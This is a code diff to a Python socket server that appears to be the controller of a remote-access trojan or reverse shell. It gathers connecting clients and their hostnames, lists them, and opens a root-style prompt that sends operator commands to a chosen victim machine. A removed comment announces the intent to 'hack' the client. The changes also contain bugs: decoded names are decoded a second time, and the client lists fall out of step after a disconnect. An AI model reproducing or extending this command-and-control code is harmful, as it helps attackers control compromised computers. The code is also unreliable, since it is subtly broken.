@@ -41,13 +41,15 @@ server.listen()
 
 clients = []
 addresses = []
+names = []
 
 def listen():
     while True:
         client, address = server.accept()
+        names.append(client.recv(1024).decode())
         clients.append(client)
         addresses.append(address)
-        print(f"Connected with {addresses[-1][0]}")
+        print(f"\nConnected with {addresses[-1][0]}")
 
 def control():
     while True:
@@ -57,33 +59,38 @@ def control():
             print("---Clients----")
 
             for client in range(len(clients)):
-                print(str(client) + " " + str(addresses[client][0]))
+                print(str(client) + " " + str(addresses[client][0]) + " " + str(names[client]))
 
             print("---Clients----")
 
         elif control_command[0:7] == "connect":
             clientID = int(input("Client ID: "))
             conn = clients[clientID]
-            #conn.send("Hello client! I will hack you!".encode())
-            
-            name = conn.recv(1024)
+
             ip = addresses[clientID]
-            
+            name = names[clientID]
             name.decode()
             while True:
                 #username.decode()) + "@" + str(addr[0])+ " :~# "
                 command = input(name.decode() + "@" + str(ip[0]) + " :~# ")
+                if command == "quit":
+                    #Shut down the socket
+                    conn.send("SHUTDOWN".encode())
+                    conn.close()
+                    conn = ""
+                    del clients[clientID]
+                    del addresses[clientID]
+                    break
                 check_command(conn=conn,command=command)
         else:
             print("Unkown command : Check your syntax please")
         
 
 
-
-
-#listens forever and appends new clients to clients list
+#listen forever and append new clients to clients' list
 listener_thread = threading.Thread(target=listen)
 listener_thread.start()
+
 control()
 
 
